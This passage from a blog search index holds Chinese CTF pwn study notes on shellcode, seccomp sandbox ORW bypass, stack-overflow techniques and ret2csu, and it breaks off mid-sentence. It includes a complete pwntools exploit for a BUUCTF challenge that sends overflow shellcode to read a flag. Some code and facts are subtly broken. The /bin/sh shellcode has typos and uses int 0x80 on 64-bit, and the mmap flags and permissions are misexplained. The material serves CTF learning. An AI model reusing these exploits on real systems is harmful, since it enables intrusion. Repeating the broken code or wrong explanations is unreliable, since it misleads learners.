<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2025/01/28/%E5%A0%86/"/>
    <url>/2025/01/28/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2025/01/26/shellcode/"/>
    <url>/2025/01/26/shellcode/</url>
    
    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>就是一段可以插入到程序或系统中并被执行的代码，shellcode的作用就是getshell</li></ul><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,mov rax, 0x68732f6e69622f ;这里后面那一大串是/bin/sh<br>push rax<br>mov rdi,rsp    ;这两行使rdi指向/bin/sh<br>mov esi,0<br>mov edo,0<br>mov rax,0x3b<br>int 0x80<br></code></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read_flag=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi,rax;</span><br><span class="hljs-string">mov rsi,rsp;</span><br><span class="hljs-string">......</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(read_flag)<br></code></pre></td></tr></table></figure><h1 id="沙盒下的orw绕过"><a href="#沙盒下的orw绕过" class="headerlink" title="沙盒下的orw绕过"></a>沙盒下的orw绕过</h1><h2 id="沙箱保护"><a href="#沙箱保护" class="headerlink" title="沙箱保护"></a>沙箱保护</h2><ul><li>对程序加入的一些保护，最常见的是禁用一些系统调用，比如exceve，使我们不可通过系统调用获取到权限，因此只能通过<strong>ROP的方式调用open,read,write</strong>等来读取并打印flag内同</li></ul><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>就是open, read,write简写，就是打开，写入，输出flag</p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>利用seccomp-tools查看是否开启了沙箱，以及沙箱中一些允许的syscall</p><p>安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> gcc ruby-dev<br>gem <span class="hljs-keyword">install</span> seccomp-tools<br></code></pre></td></tr></table></figure><p>检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h2 id="开启沙箱"><a href="#开启沙箱" class="headerlink" title="开启沙箱"></a>开启沙箱</h2><h3 id="prctl-函数调用"><a href="#prctl-函数调用" class="headerlink" title="prctl()函数调用"></a>prctl()函数调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// 主要关注prctl()函数的第一个参数，也就是option,设定的option的值的不同导致黑名单不同，介绍2个比较重要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则 禁用execve系统调用 且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure></li></ul><h3 id="seccomp-系统调用"><a href="#seccomp-系统调用" class="headerlink" title="seccomp()系统调用"></a>seccomp()系统调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-comment">// 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)</span><br>  <span class="hljs-comment">// seccomp初始化，参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式</span><br>  v1 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v1 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// seccomp_rule_add添加规则</span><br>  <span class="hljs-comment">// v1对应上面初始化的返回值</span><br>  <span class="hljs-comment">// 0x7fff0000即对应宏SCMP_ACT_ALLOW</span><br>  <span class="hljs-comment">// 第三个参数代表对应的系统调用号，0--&gt;read/1--&gt;write/2--&gt;open/60--&gt;exit</span><br>  <span class="hljs-comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传0不做任何限制</span><br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">60LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">231LL</span>, <span class="hljs-number">0LL</span>);<br><br>  <span class="hljs-comment">// seccomp_load-&gt;将当前seccomp过滤器加载到内核中</span><br>  <span class="hljs-keyword">if</span> ( seccomp_load(v1) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-comment">// seccomp_release-&gt;释放seccomp过滤器状态</span><br>    <span class="hljs-comment">// 但对已经load的过滤规则不影响</span><br>    seccomp_release(v1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> seccomp_release(v1);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="shellcode的写入"><a href="#shellcode的写入" class="headerlink" title="shellcode的写入"></a>shellcode的写入</h2><p>一般溢出的大小不够写入很长的ROP链，因此提供mmap()函数，从而给出一段栈上的内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offsize)</span>; <br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *mmap&#123;<br>    <span class="hljs-type">void</span> *addr; <span class="hljs-comment">//映射区首地址，传NULL</span><br>    <span class="hljs-type">size_t</span> length; <span class="hljs-comment">//映射区大小</span><br>    <span class="hljs-comment">//会自动调为4k的整数倍</span><br>    <span class="hljs-comment">//不能为0</span><br>    <span class="hljs-comment">//一般文件多大，length就指定多大</span><br>    <span class="hljs-type">int</span> prot; <span class="hljs-comment">//映射区权限</span><br>    <span class="hljs-comment">//PROT_READ 映射区必须要有读权限</span><br>    <span class="hljs-comment">//PROT_WRITE</span><br>    <span class="hljs-comment">//PROT_READ | PROT_WRITE</span><br>    <span class="hljs-type">int</span> flags; <span class="hljs-comment">//标志位参数</span><br>    <span class="hljs-comment">//MAP_SHARED 修改内存数据会同步到磁盘</span><br>    <span class="hljs-comment">//MAP_PRIVATE 修改内存数据不会同步到磁盘</span><br>    <span class="hljs-type">int</span> fd; <span class="hljs-comment">//要映射文件所对应的文件描述符</span><br>    <span class="hljs-type">off_t</span> offset; <span class="hljs-comment">//映射文件的偏移量，从文件哪个位置开始</span><br>    <span class="hljs-comment">//映射的时候文件指针的偏移量</span><br>    <span class="hljs-comment">//必须是4k的整数倍</span><br>    <span class="hljs-comment">//一般设为0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737913055216.png" alt="参数"></p><p>比如说</p><p><code>mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code></p><ol><li><strong><code>addr</code></strong>: <code>(void *)0x123000</code><ul><li>这是请求映射的起始地址。<code>0x123000</code> 是一个具体的地址值。如果 <code>mmap</code> 调用成功，内核会尝试将内存映射到这个地址。如果地址不可用，内核会选择一个合适的地址。</li></ul></li><li><strong><code>length</code></strong>: <code>0x1000uLL</code><ul><li>这是请求映射的内存区域的长度，单位是字节。<code>0x1000</code> 是 16 进制表示，等于 4096 字节（1 页）。</li></ul></li><li><strong><code>prot</code></strong>: <code>6</code><ul><li>这是内存区域的保护标志，定义了对该区域的访问权限。<code>6</code> 是 <code>PROT_READ | PROT_WRITE</code> 的组合，表示该区域可以读写。</li></ul></li><li><strong><code>flags</code></strong>: <code>34</code><ul><li>这是映射的标志，定义了映射的类型和行为。<code>34</code> 是 <code>MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS</code> 的组合，具体含义如下：<ul><li><code>MAP_PRIVATE</code>: 创建一个私有映射，对映射区域的修改不会反映到原始文件中。</li><li><code>MAP_FIXED</code>: 强制使用指定的地址 <code>addr</code>，如果该地址不可用，调用会失败。</li><li><code>MAP_ANONYMOUS</code>: 创建一个匿名映射，不与任何文件关联。</li></ul></li></ul></li><li><strong><code>fd</code></strong>: <code>-1</code><ul><li>这是文件描述符，用于指定映射的文件。<code>-1</code> 表示不映射任何文件，通常与 <code>MAP_ANONYMOUS</code> 一起使用。</li></ul></li><li><strong><code>offset</code></strong>: <code>0LL</code><ul><li>这是文件中的偏移量，用于指定映射的起始位置。<code>0LL</code> 表示从文件的开头开始映射。</li></ul></li></ol><p>orw绕过就是open flag，将flag写入某个区域，再write出来</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h4><p> <a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">BUUCTF在线评测</a> </p><p>checksec</p><p>懒得放截图了，反正64位什么都没开</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992637686.png" alt="seccomp-tools"></p><p>只允许read,write,open系统调用</p><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992793323.png" alt="main"></p><p>可以看到从0x123000给分配了0x1000字节空间，权限可写可执行</p><p>直接看第三个函数</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737992758135.png" alt="第三个"></p><p>存在栈溢出，但长度小</p><ul><li><p>思路：</p><p>在mmap分配的区域进行orw，并且在这个区域写入flag并输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><span class="hljs-comment"># 写在mmap+0x100的地方</span><br><span class="hljs-comment"># orw写在mmap来执行</span><br></code></pre></td></tr></table></figure><p>现在的问题是如何让rip指向那一块区域</p><p>发现程序有一个<code>jmp rsp</code>可以利用</p><p>那么我们可以构造栈</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737993374830.png" alt="栈"></p></li></ul><p>因为函数结束是有<code>leave;ret</code>leave让rsp跑到了序号2（rbp）位置，rbp跑走了，然后ret再让rsp再移动到序号1的位置，此时与read相距0x28+8&#x3D;0x30<br>所以是<code>sub rsp,0x30</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>完整：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bad&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29724</span>)<br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!\n&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><br>orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br>r.sendline(payload)<br><br>sleep(<span class="hljs-number">1</span>)<br>r.sendline(orw)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>成功得到</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/llcode/1737993658927.png" alt="^^"></p>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出</title>
    <link href="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理： 利用危险函数，将返回地址填充到栈帧上的返回地址，从<strong>控制该函数结束时返回到的地方</strong></p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h1 id="初级栈溢出"><a href="#初级栈溢出" class="headerlink" title="初级栈溢出"></a>初级栈溢出</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>利用<code>.text</code>段中的代码</p><p>确定填充长度后   构造payload即可</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul><li><p>shellcode</p><p>控制程序执行shellcode代码，常见功能是获取目标系统的shell，我们需向<strong>内存中填充一些可执行的代码</strong></p><p>意味着，<strong>shellcode所在区域需要有可执行的权限</strong></p></li><li><p>原理：</p><p>我们向可执行的区域写入shellcode，然后执行即可</p></li><li><p>pwntools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>一键生成shellcode</p></li></ul><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul><li><p>原理：</p><p>利用系统调用获取shell</p></li><li><p>系统调用知识补充：</p><p>跟函数没什么区别，不过我们所调用的函数是系统给的罢了</p><p><strong>系统调用号：rax</strong></p><p><strong>前6个参数：rdi rsi rdx r10 r8 r9</strong></p><ul><li><p>系统调用号</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x1.png" alt="32位"><br>                                                   <strong>32位</strong><br><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x2.png" alt="64位"><br>                                                   <strong>64位</strong></p></li></ul></li><li><p>ret2syscall</p><ul><li><p>寻找gadgets来控制寄存器为特定的值从而执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>工具：<code>ROPgadget --binary 可执行文件名  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p></li></ul></li></ul><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul><li><p>.plt与.got</p><p> <a href="https://blog.csdn.net/2301_80976241/article/details/144333148?ops_request_misc=%7B%22request_id%22:%22990dac9d47abe207078a2f01ce0ce74f%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=990dac9d47abe207078a2f01ce0ce74f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144333148-null-null.142%5Ev101%5Epc_search_result_base9&utm_term=plt%E4%B8%8Egot&spm=1018.2226.3001.4187">简单聊聊PLT和GOT_plt与got-CSDN博客</a> </p><p><strong>PLT（Procedure Linkage Table）</strong></p><p>PLT 是一个<strong>跳转表</strong>，跳转到got表，从而执行函数</p><p><strong>工作原理:</strong></p><p>当程序第一次调用共享库中的函数时，会通过 PLT 跳转到一个 stub 代码段。这个 stub 会将控制权转移到动态链接器(ld.so),动态链接器会在 GOT 中查找或解析目标函数的实际地址，<strong>然后更新 GOT 的对应条目</strong>,之后，<strong>再次调用同一函数时，PLT 会直接从 GOT 中读取已解析的地址并跳转到目标函数</strong>。</p><p><strong>GOT（Global Offset Table）</strong></p><p>GOT 是一个表，<strong>存储程序运行时需要使用的全局变量和函数的实际地址。</strong></p><p><strong>工作原理:</strong></p><p>程序加载时，GOT 的条目中存储的是共享库函数的默认入口地址（通常指向 PLT 中的 stub），当动态链接器解析了实际的函数地址后，<strong>会更新 GOT 对应的条目，使其指向正确的目标函数</strong>，之后，主程序对函数的调用直接通过 GOT 获取实际地址，提高效率。</p><p>也就是说，<strong>在使用一次函数后，got内存储的是真实地址</strong></p><p><strong>PLT 和 GOT协同找到正确的函数地址</strong><br>工作流程： 首先主程序中所有对共享库函数的调用，<strong>都会经过 PLT 跳转</strong>。然后PLT 中的第一跳通常指向 GOT 表中的一项。此时GOT 中的条目在未解析时会指向 PLT 中的 stub 地址，动态链接器负责更新 GOT 条目。解析完成后，<strong>GOT 保存目标函数的真实地址</strong>，后续调用直接通过 GOT 加快速度。</p></li><li><p>ret2libc</p><p>也就是利用libc中的system函数和&#x2F;bin&#x2F;sh的地址获取目标系统shell</p><p>利用泄露已知函数的真实地址，计算libc基地址，从而得到system与&#x2F;bin&#x2F;sh的真实地址，从而得到shell</p></li></ul><h1 id="中级栈溢出"><a href="#中级栈溢出" class="headerlink" title="中级栈溢出"></a>中级栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul><li>在64位程序中，前6个参数由寄存器传递，但大多数时候，难找到每一个寄存器的gadgets，这时可以利用_libc_csu_csu中的gadgets</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004005</span>C0 ; <span class="hljs-type">void</span> _libc_csu_init(<span class="hljs-type">void</span>)<br>.text:<span class="hljs-number">00000000004005</span>C0                 public __libc_csu_init<br>.text:<span class="hljs-number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="hljs-number">16</span>o<br>.text:<span class="hljs-number">00000000004005</span>C0                 push    r15<br>.text:<span class="hljs-number">00000000004005</span>C2                 push    r14<br>.text:<span class="hljs-number">00000000004005</span>C4                 mov     r15d, edi<br>.text:<span class="hljs-number">00000000004005</span>C7                 push    r13<br>.text:<span class="hljs-number">00000000004005</span>C9                 push    r12<br>.text:<span class="hljs-number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry<br>.text:<span class="hljs-number">00000000004005</span>D2                 push    rbp<br>.text:<span class="hljs-number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:<span class="hljs-number">00000000004005</span>DA                 push    rbx<br>.text:<span class="hljs-number">00000000004005</span>DB                 mov     r14, rsi<br>.text:<span class="hljs-number">00000000004005</span>DE                 mov     r13, rdx<br>.text:<span class="hljs-number">00000000004005E1</span>                 sub     rbp, r12<br>.text:<span class="hljs-number">00000000004005E4</span>                 sub     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000004005E8</span>                 sar     rbp, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004005</span>EC                 call    _init_proc<br>.text:<span class="hljs-number">00000000004005F</span>1                 test    rbp, rbp<br>.text:<span class="hljs-number">00000000004005F</span>4                 jz      <span class="hljs-type">short</span> loc_400616<br>.text:<span class="hljs-number">00000000004005F</span>6                 xor     ebx, ebx<br>.text:<span class="hljs-number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br>.text:<span class="hljs-number">0000000000400600</span><br>.text:<span class="hljs-number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>j<br><span class="hljs-comment">//主要利用以下模块</span><br>.text:<span class="hljs-number">0000000000400600</span>                 mov     rdx, r13<br>.text:<span class="hljs-number">0000000000400603</span>                 mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400606</span>                 mov     edi, r15d<br>.text:<span class="hljs-number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">000000000040060</span>D                 add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400611</span>                 cmp     rbx, rbp<br>.text:<span class="hljs-number">0000000000400614</span>                 jnz     <span class="hljs-type">short</span> loc_400600<br>.text:<span class="hljs-number">0000000000400616</span><br>.text:<span class="hljs-number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>j<br>.text:<span class="hljs-number">0000000000400616</span>                 add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040061</span>A                 pop     rbx<br>.text:<span class="hljs-number">000000000040061B</span>                 pop     rbp<br>.text:<span class="hljs-number">000000000040061</span>C                 pop     r12<br>.text:<span class="hljs-number">000000000040061</span>E                 pop     r13<br>.text:<span class="hljs-number">0000000000400620</span>                 pop     r14<br>.text:<span class="hljs-number">0000000000400622</span>                 pop     r15<br>.text:<span class="hljs-number">0000000000400624</span>                 retn<br>.text:<span class="hljs-number">0000000000400624</span> __libc_csu_init endp<br></code></pre></td></tr></table></figure><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 <strong>rbx,rbp,r12,r13,r14,r15</strong> 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将<strong>r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi</strong>（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 <strong>rbx+1 &#x3D; rbp</strong>，这样我们就<strong>不会执行</strong> 